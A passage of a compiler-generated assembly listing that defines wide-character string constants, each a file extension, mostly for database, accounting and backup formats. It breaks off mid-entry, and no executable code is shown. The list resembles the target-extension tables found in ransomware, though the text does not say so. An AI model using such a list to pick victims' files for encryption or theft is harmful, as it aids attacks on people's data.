CONST	ENDS
;	COMDAT ??_C@_19LKOAOCLF@?$AA?4?$AAn?$AAy?$AAf@
CONST	SEGMENT
??_C@_19LKOAOCLF@?$AA?4?$AAn?$AAy?$AAf@ DB '.', 00H, 'n', 00H, 'y', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@BONLOPPI@?$AA?4?$AAn?$AAw?$AAd?$AAb@
CONST	SEGMENT
??_C@_1M@BONLOPPI@?$AA?4?$AAn?$AAw?$AAd?$AAb@ DB '.', 00H, 'n', 00H, 'w', 00H
	DB	'd', 00H, 'b', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19PNJMIJF@?$AA?4?$AAn?$AAv?$AA2@
CONST	SEGMENT
??_C@_19PNJMIJF@?$AA?4?$AAn?$AAv?$AA2@ DB '.', 00H, 'n', 00H, 'v', 00H, '2'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_17KILMBJI@?$AA?4?$AAn?$AAv@
CONST	SEGMENT
??_C@_17KILMBJI@?$AA?4?$AAn?$AAv@ DB '.', 00H, 'n', 00H, 'v', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_19BLHLMBND@?$AA?4?$AAn?$AAs?$AAf@
CONST	SEGMENT
??_C@_19BLHLMBND@?$AA?4?$AAn?$AAs?$AAf@ DB '.', 00H, 'n', 00H, 's', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19HKHPAGPK@?$AA?4?$AAn?$AAs?$AA4@
CONST	SEGMENT
??_C@_19HKHPAGPK@?$AA?4?$AAn?$AAs?$AA4@ DB '.', 00H, 'n', 00H, 's', 00H, '4'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19OHKIDOED@?$AA?4?$AAn?$AAs?$AA3@
CONST	SEGMENT
??_C@_19OHKIDOED@?$AA?4?$AAn?$AAs?$AA3@ DB '.', 00H, 'n', 00H, 's', 00H, '3'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19FPBEFJCG@?$AA?4?$AAn?$AAs?$AA2@
CONST	SEGMENT
??_C@_19FPBEFJCG@?$AA?4?$AAn?$AAs?$AA2@ DB '.', 00H, 'n', 00H, 's', 00H, '2'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@LGEHKHJA@?$AA?4?$AAn?$AAr?$AAm?$AAl?$AAi?$AAb@
CONST	SEGMENT
??_C@_1BA@LGEHKHJA@?$AA?4?$AAn?$AAr?$AAm?$AAl?$AAi?$AAb@ DB '.', 00H, 'n', 00H
	DB	'r', 00H, 'm', 00H, 'l', 00H, 'i', 00H, 'b', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_19FOCDEPIC@?$AA?4?$AAn?$AAn?$AAt@
CONST	SEGMENT
??_C@_19FOCDEPIC@?$AA?4?$AAn?$AAn?$AAt@ DB '.', 00H, 'n', 00H, 'n', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19FKIPDPA@?$AA?4?$AAn?$AAd?$AAf@
CONST	SEGMENT
??_C@_19FKIPDPA@?$AA?4?$AAn?$AAd?$AAf@ DB '.', 00H, 'n', 00H, 'd', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19JOGGCNNN@?$AA?4?$AAm?$AAy?$AAd@
CONST	SEGMENT
??_C@_19JOGGCNNN@?$AA?4?$AAm?$AAy?$AAd@ DB '.', 00H, 'm', 00H, 'y', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19IBAHBDHB@?$AA?4?$AAm?$AAw?$AAb@
CONST	SEGMENT
??_C@_19IBAHBDHB@?$AA?4?$AAm?$AAw?$AAb@ DB '.', 00H, 'm', 00H, 'w', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19OJKEONKG@?$AA?4?$AAm?$AAu?$AAd@
CONST	SEGMENT
??_C@_19OJKEONKG@?$AA?4?$AAm?$AAu?$AAd@ DB '.', 00H, 'm', 00H, 'u', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19OGBEHCPA@?$AA?4?$AAm?$AAr?$AAg@
CONST	SEGMENT
??_C@_19OGBEHCPA@?$AA?4?$AAm?$AAr?$AAg@ DB '.', 00H, 'm', 00H, 'r', 00H, 'g'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LJGJHMBF@?$AA?4?$AAm?$AAp?$AAd@
CONST	SEGMENT
??_C@_19LJGJHMBF@?$AA?4?$AAm?$AAp?$AAd@ DB '.', 00H, 'm', 00H, 'p', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19ILCHPEBD@?$AA?4?$AAm?$AAd?$AAf@
CONST	SEGMENT
??_C@_19ILCHPEBD@?$AA?4?$AAm?$AAd?$AAf@ DB '.', 00H, 'm', 00H, 'd', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19EEFGDEE@?$AA?4?$AAm?$AAd?$AAb@
CONST	SEGMENT
??_C@_19EEFGDEE@?$AA?4?$AAm?$AAd?$AAb@ DB '.', 00H, 'm', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19ILPDDCDP@?$AA?4?$AAm?$AAa?$AAv@
CONST	SEGMENT
??_C@_19ILPDDCDP@?$AA?4?$AAm?$AAa?$AAv@ DB '.', 00H, 'm', 00H, 'a', 00H, 'v'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LMCNMCAN@?$AA?4?$AAm?$AAa?$AAs@
CONST	SEGMENT
??_C@_19LMCNMCAN@?$AA?4?$AAm?$AAa?$AAs@ DB '.', 00H, 'm', 00H, 'a', 00H, 's'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19EJBKFGI@?$AA?4?$AAm?$AAa?$AAr@
CONST	SEGMENT
??_C@_19EJBKFGI@?$AA?4?$AAm?$AAa?$AAr@ DB '.', 00H, 'm', 00H, 'a', 00H, 'r'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BGCEAKIG@?$AA?4?$AAm?$AAa?$AAq@
CONST	SEGMENT
??_C@_19BGCEAKIG@?$AA?4?$AAm?$AAa?$AAq@ DB '.', 00H, 'm', 00H, 'a', 00H, 'q'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19NLOKGFKA@?$AA?4?$AAm?$AAa?$AAf@
CONST	SEGMENT
??_C@_19NLOKGFKA@?$AA?4?$AAm?$AAa?$AAf@ DB '.', 00H, 'm', 00H, 'a', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19HCAJKEBE@?$AA?4?$AAl?$AAw?$AAx@
CONST	SEGMENT
??_C@_19HCAJKEBE@?$AA?4?$AAl?$AAw?$AAx@ DB '.', 00H, 'l', 00H, 'w', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19PGMHHGBB@?$AA?4?$AAl?$AAg?$AAc@
CONST	SEGMENT
??_C@_19PGMHHGBB@?$AA?4?$AAl?$AAg?$AAc@ DB '.', 00H, 'l', 00H, 'g', 00H, 'c'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@GPHBHHJH@?$AA?4?$AAk?$AAe?$AAx?$AAi?$AAs@
CONST	SEGMENT
??_C@_1O@GPHBHHJH@?$AA?4?$AAk?$AAe?$AAx?$AAi?$AAs@ DB '.', 00H, 'k', 00H, 'e'
	DB	00H, 'x', 00H, 'i', 00H, 's', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@DPGICAAI@?$AA?4?$AAk?$AAe?$AAx?$AAi?$AAc@
CONST	SEGMENT
??_C@_1O@DPGICAAI@?$AA?4?$AAk?$AAe?$AAx?$AAi?$AAc@ DB '.', 00H, 'k', 00H, 'e'
	DB	00H, 'x', 00H, 'i', 00H, 'c', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@GFHJFHAL@?$AA?4?$AAk?$AAe?$AAx?$AAi@
CONST	SEGMENT
??_C@_1M@GFHJFHAL@?$AA?4?$AAk?$AAe?$AAx?$AAi@ DB '.', 00H, 'k', 00H, 'e', 00H
	DB	'x', 00H, 'i', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19MCCKGKMD@?$AA?4?$AAk?$AAd?$AAb@
CONST	SEGMENT
??_C@_19MCCKGKMD@?$AA?4?$AAk?$AAd?$AAb@ DB '.', 00H, 'k', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DCPCNPDN@?$AA?4?$AAj?$AAt?$AAx@
CONST	SEGMENT
??_C@_19DCPCNPDN@?$AA?4?$AAj?$AAt?$AAx@ DB '.', 00H, 'j', 00H, 't', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LAKOLBLL@?$AA?4?$AAj?$AAe?$AAt@
CONST	SEGMENT
??_C@_19LAKOLBLL@?$AA?4?$AAj?$AAe?$AAt@ DB '.', 00H, 'j', 00H, 'e', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19OEBOMIII@?$AA?4?$AAi?$AAt?$AAw@
CONST	SEGMENT
??_C@_19OEBOMIII@?$AA?4?$AAi?$AAt?$AAw@ DB '.', 00H, 'i', 00H, 't', 00H, 'w'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@HCIIPDGC@?$AA?4?$AAi?$AAt?$AAd?$AAb@
CONST	SEGMENT
??_C@_1M@HCIIPDGC@?$AA?4?$AAi?$AAt?$AAd?$AAb@ DB '.', 00H, 'i', 00H, 't', 00H
	DB	'd', 00H, 'b', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19MIGJBKDO@?$AA?4?$AAi?$AAh?$AAx@
CONST	SEGMENT
??_C@_19MIGJBKDO@?$AA?4?$AAi?$AAh?$AAx@ DB '.', 00H, 'i', 00H, 'h', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19IAAPGNLO@?$AA?4?$AAi?$AAd?$AAb@
CONST	SEGMENT
??_C@_19IAAPGNLO@?$AA?4?$AAi?$AAd?$AAb@ DB '.', 00H, 'i', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_17MIPFDBOI@?$AA?4?$AAi?$AAb@
CONST	SEGMENT
??_C@_17MIPFDBOI@?$AA?4?$AAi?$AAb@ DB '.', 00H, 'i', 00H, 'b', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_19BIJOEOAE@?$AA?4?$AAh?$AAi?$AAs@
CONST	SEGMENT
??_C@_19BIJOEOAE@?$AA?4?$AAh?$AAi?$AAs@ DB '.', 00H, 'h', 00H, 'i', 00H, 's'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19EMKFGNCA@?$AA?4?$AAh?$AAd?$AAb@
CONST	SEGMENT
??_C@_19EMKFGNCA@?$AA?4?$AAh?$AAd?$AAb@ DB '.', 00H, 'h', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19MHMGIILI@?$AA?4?$AAg?$AAw?$AAi@
CONST	SEGMENT
??_C@_19MHMGIILI@?$AA?4?$AAg?$AAw?$AAi@ DB '.', 00H, 'g', 00H, 'w', 00H, 'i'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@KKCOMKFG@?$AA?4?$AAg?$AAr?$AAd?$AAb@
CONST	SEGMENT
??_C@_1M@KKCOMKFG@?$AA?4?$AAg?$AAr?$AAd?$AAb@ DB '.', 00H, 'g', 00H, 'r', 00H
	DB	'd', 00H, 'b', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19JFIFHPIM@?$AA?4?$AAg?$AAd?$AAb@
CONST	SEGMENT
??_C@_19JFIFHPIM@?$AA?4?$AAg?$AAd?$AAb@ DB '.', 00H, 'g', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19NEMDIOMC@?$AA?4?$AAf?$AAr?$AAm@
CONST	SEGMENT
??_C@_19NEMDIOMC@?$AA?4?$AAf?$AAr?$AAm@ DB '.', 00H, 'f', 00H, 'r', 00H, 'm'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LEBKDHNM@?$AA?4?$AAf?$AAp?$AAt@
CONST	SEGMENT
??_C@_19LEBKDHNM@?$AA?4?$AAf?$AAp?$AAt@ DB '.', 00H, 'f', 00H, 'p', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DNLLMAAP@?$AA?4?$AAf?$AAp?$AA7@
CONST	SEGMENT
??_C@_19DNLLMAAP@?$AA?4?$AAf?$AAp?$AA7@ DB '.', 00H, 'f', 00H, 'p', 00H, '7'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19JHLCAIIE@?$AA?4?$AAf?$AAp?$AA5@
CONST	SEGMENT
??_C@_19JHLCAIIE@?$AA?4?$AAf?$AAp?$AA5@ DB '.', 00H, 'f', 00H, 'p', 00H, '5'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19CPAOGPOB@?$AA?4?$AAf?$AAp?$AA4@
CONST	SEGMENT
??_C@_19CPAOGPOB@?$AA?4?$AAf?$AAp?$AA4@ DB '.', 00H, 'f', 00H, 'p', 00H, '4'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LCNJFHFI@?$AA?4?$AAf?$AAp?$AA3@
CONST	SEGMENT
??_C@_19LCNJFHFI@?$AA?4?$AAf?$AAp?$AA3@ DB '.', 00H, 'f', 00H, 'p', 00H, '3'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19NDDHPIOC@?$AA?4?$AAf?$AAo?$AAl@
CONST	SEGMENT
??_C@_19NDDHPIOC@?$AA?4?$AAf?$AAo?$AAl@ DB '.', 00H, 'f', 00H, 'o', 00H, 'l'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@JLNLELAM@?$AA?4?$AAf?$AAm?$AAp?$AAs?$AAl@
CONST	SEGMENT
??_C@_1O@JLNLELAM@?$AA?4?$AAf?$AAm?$AAp?$AAs?$AAl@ DB '.', 00H, 'f', 00H, 'm'
	DB	00H, 'p', 00H, 's', 00H, 'l', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@PCJJJIPK@?$AA?4?$AAf?$AAm?$AAp?$AA1?$AA2@
CONST	SEGMENT
??_C@_1O@PCJJJIPK@?$AA?4?$AAf?$AAm?$AAp?$AA1?$AA2@ DB '.', 00H, 'f', 00H, 'm'
	DB	00H, 'p', 00H, '1', 00H, '2', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_19IEDALBMO@?$AA?4?$AAf?$AAm?$AAp@
CONST	SEGMENT
??_C@_19IEDALBMO@?$AA?4?$AAf?$AAm?$AAp@ DB '.', 00H, 'f', 00H, 'm', 00H, 'p'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19FNANALKJ@?$AA?4?$AAf?$AAi?$AAc@
CONST	SEGMENT
??_C@_19FNANALKJ@?$AA?4?$AAf?$AAi?$AAc@ DB '.', 00H, 'f', 00H, 'i', 00H, 'c'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19FJCPHPBC@?$AA?4?$AAf?$AAd?$AAb@
CONST	SEGMENT
??_C@_19FJCPHPBC@?$AA?4?$AAf?$AAd?$AAb@ DB '.', 00H, 'f', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19GBEBBAHG@?$AA?4?$AAf?$AAc?$AAd@
CONST	SEGMENT
??_C@_19GBEBBAHG@?$AA?4?$AAf?$AAc?$AAd@ DB '.', 00H, 'f', 00H, 'c', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19KDLELKBB@?$AA?4?$AAe?$AAx?$AAb@
CONST	SEGMENT
??_C@_19KDLELKBB@?$AA?4?$AAe?$AAx?$AAb@ DB '.', 00H, 'e', 00H, 'x', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@IADBOJO@?$AA?4?$AAe?$AAp?$AAi?$AAm@
CONST	SEGMENT
??_C@_1M@IADBOJO@?$AA?4?$AAe?$AAp?$AAi?$AAm@ DB '.', 00H, 'e', 00H, 'p', 00H
	DB	'i', 00H, 'm', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19NHKAHIPB@?$AA?4?$AAe?$AAd?$AAb@
CONST	SEGMENT
??_C@_19NHKAHIPB@?$AA?4?$AAe?$AAd?$AAb@ DB '.', 00H, 'e', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19PFABPPLC@?$AA?4?$AAe?$AAc?$AAx@
CONST	SEGMENT
??_C@_19PFABPPLC@?$AA?4?$AAe?$AAc?$AAx@ DB '.', 00H, 'e', 00H, 'c', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DIMPJAJE@?$AA?4?$AAe?$AAc?$AAo@
CONST	SEGMENT
??_C@_19DIMPJAJE@?$AA?4?$AAe?$AAc?$AAo@ DB '.', 00H, 'e', 00H, 'c', 00H, 'o'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19IPMBMNLM@?$AA?4?$AAd?$AAx?$AAl@
CONST	SEGMENT
??_C@_19IPMBMNLM@?$AA?4?$AAd?$AAx?$AAl@ DB '.', 00H, 'd', 00H, 'x', 00H, 'l'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@KGABPNAK@?$AA?4?$AAd?$AAt?$AAs?$AAx@
CONST	SEGMENT
??_C@_1M@KGABPNAK@?$AA?4?$AAd?$AAt?$AAs?$AAx@ DB '.', 00H, 'd', 00H, 't', 00H
	DB	's', 00H, 'x', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19EPAPPFPE@?$AA?4?$AAd?$AAs?$AAn@
CONST	SEGMENT
??_C@_19EPAPPFPE@?$AA?4?$AAd?$AAs?$AAn@ DB '.', 00H, 'd', 00H, 's', 00H, 'n'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19HINBAFMG@?$AA?4?$AAd?$AAs?$AAk@
CONST	SEGMENT
??_C@_19HINBAFMG@?$AA?4?$AAd?$AAs?$AAk@ DB '.', 00H, 'd', 00H, 's', 00H, 'k'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19MPAJDLNJ@?$AA?4?$AAd?$AAq?$AAy@
CONST	SEGMENT
??_C@_19MPAJDLNJ@?$AA?4?$AAd?$AAq?$AAy@ DB '.', 00H, 'd', 00H, 'q', 00H, 'y'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19FKPFJIKO@?$AA?4?$AAd?$AAp?$AA1@
CONST	SEGMENT
??_C@_19FKPFJIKO@?$AA?4?$AAd?$AAp?$AA1@ DB '.', 00H, 'd', 00H, 'p', 00H, '1'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@HMBDHBGI@?$AA?4?$AAd?$AAl?$AAi?$AAs@
CONST	SEGMENT
??_C@_1M@HMBDHBGI@?$AA?4?$AAd?$AAl?$AAi?$AAs@ DB '.', 00H, 'd', 00H, 'l', 00H
	DB	'i', 00H, 's', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19PLNFAPFM@?$AA?4?$AAd?$AAd?$AAl@
CONST	SEGMENT
??_C@_19PLNFAPFM@?$AA?4?$AAd?$AAd?$AAl@ DB '.', 00H, 'd', 00H, 'd', 00H, 'l'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DJKLPPCM@?$AA?4?$AAd?$AAc?$AAx@
CONST	SEGMENT
??_C@_19DJKLPPCM@?$AA?4?$AAd?$AAc?$AAx@ DB '.', 00H, 'd', 00H, 'c', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19HDHNEAJE@?$AA?4?$AAd?$AAc?$AAt@
CONST	SEGMENT
??_C@_19HDHNEAJE@?$AA?4?$AAd?$AAc?$AAt@ DB '.', 00H, 'd', 00H, 'c', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19GAPEINH@?$AA?4?$AAd?$AAc?$AAb@
CONST	SEGMENT
??_C@_19GAPEINH@?$AA?4?$AAd?$AAc?$AAb@ DB '.', 00H, 'd', 00H, 'c', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19PCPHCMIJ@?$AA?4?$AAd?$AAb?$AAx@
CONST	SEGMENT
??_C@_19PCPHCMIJ@?$AA?4?$AAd?$AAb?$AAx@ DB '.', 00H, 'd', 00H, 'b', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BCCIFLLK@?$AA?4?$AAd?$AAb?$AAv@
CONST	SEGMENT
??_C@_19BCCIFLLK@?$AA?4?$AAd?$AAb?$AAv@ DB '.', 00H, 'd', 00H, 'b', 00H, 'v'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LICBJDDB@?$AA?4?$AAd?$AAb?$AAt@
CONST	SEGMENT
??_C@_19LICBJDDB@?$AA?4?$AAd?$AAb?$AAt@ DB '.', 00H, 'd', 00H, 'b', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19CFPGKLII@?$AA?4?$AAd?$AAb?$AAs@
CONST	SEGMENT
??_C@_19CFPGKLII@?$AA?4?$AAd?$AAb?$AAs@ DB '.', 00H, 'd', 00H, 'b', 00H, 's'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19ECDBAMCF@?$AA?4?$AAd?$AAb?$AAf@
CONST	SEGMENT
??_C@_19ECDBAMCF@?$AA?4?$AAd?$AAb?$AAf@ DB '.', 00H, 'd', 00H, 'b', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19HFOPPMBH@?$AA?4?$AAd?$AAb?$AAc@
CONST	SEGMENT
??_C@_19HFOPPMBH@?$AA?4?$AAd?$AAb?$AAc@ DB '.', 00H, 'd', 00H, 'b', 00H, 'c'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LOOCPDLF@?$AA?4?$AAd?$AAb?$AA3@
CONST	SEGMENT
??_C@_19LOOCPDLF@?$AA?4?$AAd?$AAb?$AA3@ DB '.', 00H, 'd', 00H, 'b', 00H, '3'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@NLIPEPHE@?$AA?4?$AAd?$AAb?$AA?9?$AAw?$AAa?$AAl@
CONST	SEGMENT
??_C@_1BA@NLIPEPHE@?$AA?4?$AAd?$AAb?$AA?9?$AAw?$AAa?$AAl@ DB '.', 00H, 'd'
	DB	00H, 'b', 00H, '-', 00H, 'w', 00H, 'a', 00H, 'l', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@MAHGHHCD@?$AA?4?$AAd?$AAb?$AA?9?$AAs?$AAh?$AAm@
CONST	SEGMENT
??_C@_1BA@MAHGHHCD@?$AA?4?$AAd?$AAb?$AA?9?$AAs?$AAh?$AAm@ DB '.', 00H, 'd'
	DB	00H, 'b', 00H, '-', 00H, 's', 00H, 'h', 00H, 'm', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_17HEGLCCDG@?$AA?4?$AAd?$AAb@
CONST	SEGMENT
??_C@_17HEGLCCDG@?$AA?4?$AAd?$AAb@ DB '.', 00H, 'd', 00H, 'b', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BE@CMGNDCIB@?$AA?4?$AAd?$AAa?$AAs?$AAc?$AAh?$AAe?$AAm?$AAa@
CONST	SEGMENT
??_C@_1BE@CMGNDCIB@?$AA?4?$AAd?$AAa?$AAs?$AAc?$AAh?$AAe?$AAm?$AAa@ DB '.', 00H
	DB	'd', 00H, 'a', 00H, 's', 00H, 'c', 00H, 'h', 00H, 'e', 00H, 'm'
	DB	00H, 'a', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1BI@PCJHNNLF@?$AA?4?$AAd?$AAa?$AAd?$AAi?$AAa?$AAg?$AAr?$AAa?$AAm?$AAs@
CONST	SEGMENT
??_C@_1BI@PCJHNNLF@?$AA?4?$AAd?$AAa?$AAd?$AAi?$AAa?$AAg?$AAr?$AAa?$AAm?$AAs@ DB '.'
	DB	00H, 'd', 00H, 'a', 00H, 'd', 00H, 'i', 00H, 'a', 00H, 'g', 00H
	DB	'r', 00H, 'a', 00H, 'm', 00H, 's', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_19GOKMLGAA@?$AA?4?$AAd?$AAa?$AAd@
CONST	SEGMENT
??_C@_19GOKMLGAA@?$AA?4?$AAd?$AAa?$AAd@ DB '.', 00H, 'd', 00H, 'a', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@HOMELDNI@?$AA?4?$AAd?$AAa?$AAc?$AAp?$AAa?$AAc@
CONST	SEGMENT
??_C@_1BA@HOMELDNI@?$AA?4?$AAd?$AAa?$AAc?$AAp?$AAa?$AAc@ DB '.', 00H, 'd', 00H
	DB	'a', 00H, 'c', 00H, 'p', 00H, 'a', 00H, 'c', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_19KMODGOCH@?$AA?4?$AAc?$AAp?$AAd@
CONST	SEGMENT
??_C@_19KMODGOCH@?$AA?4?$AAc?$AAp?$AAd@ DB '.', 00H, 'c', 00H, 'p', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19CEHFIPFA@?$AA?4?$AAc?$AAm?$AAa@
CONST	SEGMENT
??_C@_19CEHFIPFA@?$AA?4?$AAc?$AAm?$AAa@ DB '.', 00H, 'c', 00H, 'm', 00H, 'a'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BKIJFMLH@?$AA?4?$AAc?$AAk?$AAp@
CONST	SEGMENT
??_C@_19BKIJFMLH@?$AA?4?$AAc?$AAk?$AAp@ DB '.', 00H, 'c', 00H, 'k', 00H, 'p'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BBMPHBHG@?$AA?4?$AAc?$AAd?$AAb@
CONST	SEGMENT
??_C@_19BBMPHBHG@?$AA?4?$AAc?$AAd?$AAb@ DB '.', 00H, 'c', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DEHAOIIG@?$AA?4?$AAc?$AAa?$AAt@
CONST	SEGMENT
??_C@_19DEHAOIIG@?$AA?4?$AAc?$AAa?$AAt@ DB '.', 00H, 'c', 00H, 'a', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19FCAHOGLP@?$AA?4?$AAb?$AAd?$AAf@
CONST	SEGMENT
??_C@_19FCAHOGLP@?$AA?4?$AAb?$AAd?$AAf@ DB '.', 00H, 'b', 00H, 'd', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19IOKKCEOM@?$AA?4?$AAb?$AAt?$AAr@
CONST	SEGMENT
??_C@_19IOKKCEOM@?$AA?4?$AAb?$AAt?$AAr@ DB '.', 00H, 'b', 00H, 't', 00H, 'r'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DADBALKC@?$AA?4?$AAa?$AAs?$AAk@
CONST	SEGMENT
??_C@_19DADBALKC@?$AA?4?$AAa?$AAs?$AAk@ DB '.', 00H, 'a', 00H, 's', 00H, 'k'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DANLGDDB@?$AA?4?$AAa?$AAl?$AAf@
CONST	SEGMENT
??_C@_19DANLGDDB@?$AA?4?$AAa?$AAl?$AAf@ DB '.', 00H, 'a', 00H, 'l', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19IBFKCKFB@?$AA?4?$AAo?$AAr?$AAa@
